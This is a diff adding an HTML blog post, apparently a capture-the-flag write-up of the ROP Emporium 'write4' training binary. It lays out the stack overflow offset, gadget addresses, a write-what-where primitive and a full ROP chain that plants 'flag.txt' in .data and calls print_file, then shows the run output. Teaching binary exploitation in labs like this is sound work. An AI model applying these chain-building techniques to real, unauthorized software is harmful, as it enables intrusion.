@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ROP Emporium — write4 (x86_64) — Tiu</title>
+<style>
+  :root { --bg:#0d1117; --fg:#e6edf3; --dim:#8b949e; --acc:#58a6ff; --card:#161b22; --line:#30363d; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--fg);
+        font:16px/1.7 -apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; }
+  .wrap { max-width:860px; margin:0 auto; padding:2rem 1.2rem 4rem; }
+  header.site { border-bottom:1px solid var(--line); margin-bottom:2rem; padding-bottom:1rem; }
+  header.site h1 { margin:0; font-size:1.4rem; }
+  header.site .sub { color:var(--dim); font-size:.95rem; }
+  a { color:var(--acc); text-decoration:none; }
+  a:hover { text-decoration:underline; }
+  nav a { margin-right:1rem; color:var(--dim); }
+  article h1 { font-size:1.7rem; border-bottom:1px solid var(--line); padding-bottom:.4rem; }
+  h2 { margin-top:2rem; }
+  blockquote { margin:1rem 0; padding:.6rem 1rem; border-left:3px solid var(--acc);
+               background:var(--card); color:var(--dim); }
+  pre { background:var(--card); border:1px solid var(--line); border-radius:8px;
+        padding:1rem; overflow-x:auto; font-size:.88rem; }
+  code { font-family:"Cascadia Code",Consolas,Menlo,monospace; }
+  :not(pre) > code { background:var(--card); border:1px solid var(--line);
+                     border-radius:4px; padding:.1em .35em; font-size:.9em; }
+  table { border-collapse:collapse; width:100%; margin:1rem 0; }
+  th, td { border:1px solid var(--line); padding:.45rem .7rem; text-align:left; }
+  th { background:var(--card); }
+  .card { background:var(--card); border:1px solid var(--line); border-radius:10px;
+          padding:1.1rem 1.3rem; margin:1rem 0; display:block; color:var(--fg); }
+  .card:hover { border-color:var(--acc); text-decoration:none; }
+  .card .meta { color:var(--dim); font-size:.88rem; margin-top:.3rem; }
+  .card h3 { margin:.1rem 0 .3rem; color:var(--acc); }
+  footer { margin-top:3rem; padding-top:1rem; border-top:1px solid var(--line);
+           color:var(--dim); font-size:.85rem; }
+</style>
+</head>
+<body>
+<div class="wrap">
+<header class="site">
+  <h1><a href="index.html" style="color:inherit">Tiu — Security Research Notes</a></h1>
+  <div class="sub">Binary exploitation · Reverse engineering · Memory & network forensics</div>
+  <nav><a href="index.html">Posts</a><a href="https://github.com/dabai-sec">GitHub</a></nav>
+</header>
+<h1>ROP Emporium — write4 (x86_64)</h1>
+<blockquote>
+<p><strong>Category:</strong> pwn / binary exploitation
+<strong>Binary:</strong> <a href="https://ropemporium.com/challenge/write4.html">write4</a> (ROP Emporium, x86_64)
+<strong>Techniques:</strong> stack overflow → ROP, write-what-where gadget (<code>mov [r14], r15</code>), planting a string in <code>.data</code>, calling <code>print_file()</code> with a controlled pointer
+<strong>Environment:</strong> authorized training binary, local lab</p>
+</blockquote>
+<p><code>write4</code> splits the win condition in two: <code>print_file()</code> exists and works,
+but the string <code>"flag.txt"</code> is <strong>nowhere in the binary</strong>. We must write it
+into writable memory ourselves, then pass its address.</p>
+<h2>1. Recon</h2>
+<pre><code>$ file write4
+write4: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
+</code></pre>
+<p>NX on, no PIE, symbols present — same profile as the rest of the series.
+<code>pwnme()</code> (in <code>libwrite4.so</code>) has the usual 32-byte stack buffer read with
+<code>read(0, buf, 0x200)</code>, so the return address sits at offset <strong>40</strong>.</p>
+<h2>2. The missing string</h2>
+<pre><code>$ strings write4 | grep flag
+(nothing — &quot;flag.txt&quot; is not in the binary)
+</code></pre>
+<p><code>usefulFunction()</code> calls <code>print_file("nonexistent.txt")</code> — a dead end. The
+challenge is exactly this: get <code>"flag.txt"</code> into memory ourselves.</p>
+<h2>3. The write primitive</h2>
+<p><code>usefulGadgets()</code> hands us a two-register write-what-where:</p>
+<pre><code>0000000000400628 &lt;usefulGadgets&gt;:
+  400628:  mov    [r14], r15
+  40062b:  ret
+</code></pre>
+<p>To drive it we need to control <code>r14</code> and <code>r15</code>. Byte-scanning <code>.text</code> for
+the classic <code>__libc_csu_init</code> epilogue:</p>
+<pre><code>pop r14 ; pop r15 ; ret  @ 0x400690   (bytes 41 5e 41 5f c3)
+pop rdi ; ret            @ 0x400693   (byte pattern 5f c3, one byte into 41 5f)
+</code></pre>
+<p><code>pop rdi</code> hides <em>inside</em> <code>pop r15</code> — gadget hunting by bytes, not by
+instructions.</p>
+<p>Writable target: <code>.data</code> at <code>0x601028</code> (16 zero bytes) — enough for
+<code>"flag.txt"</code> plus the NUL terminator that's already there.</p>
+<h2>4. The chain</h2>
+<p><code>"flag.txt"</code> is exactly 8 bytes — a single <code>mov [r14], r15</code> plants it whole:</p>
+<pre><code>[ 40 * &quot;A&quot;          ]  buffer + saved rbp
+[ 0x400690        ]  pop r14 ; pop r15 ; ret
+[ 0x601028        ]  r14 = &amp;.data
+[ &quot;flag.txt&quot;      ]  r15 = the string (as an immediate qword)
+[ 0x400628        ]  mov [r14], r15      -&gt; .data now holds &quot;flag.txt&quot;
+[ 0x400693        ]  pop rdi ; ret
+[ 0x601028        ]  rdi = &amp;.data
+[ 0x400510        ]  print_file@plt
+</code></pre>
+<h2>5. Run</h2>
+<pre><code>$ python3 exploit.py
+write4 by ROP Emporium
+x86_64
+Go ahead and give me the input already!
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<p>Flag: <code>ROPE{a_placeholder_32byte_flag!}</code> (ROP Emporium's static placeholder).</p>
+<h2>Takeaway</h2>
+<p>The jump from ret2win/split to write4 is realizing that <strong>data can travel
+through registers</strong>: any <code>mov [rA], rB</code> gadget plus two pops turns the stack
+into a memory writer, and once you can write, missing strings stop mattering.</p>
+<footer>All research performed in authorized environments (CTF events, lab ranges,
+public training datasets). · © 2026 Tiu</footer>
+</div>
+</body>
+</html>
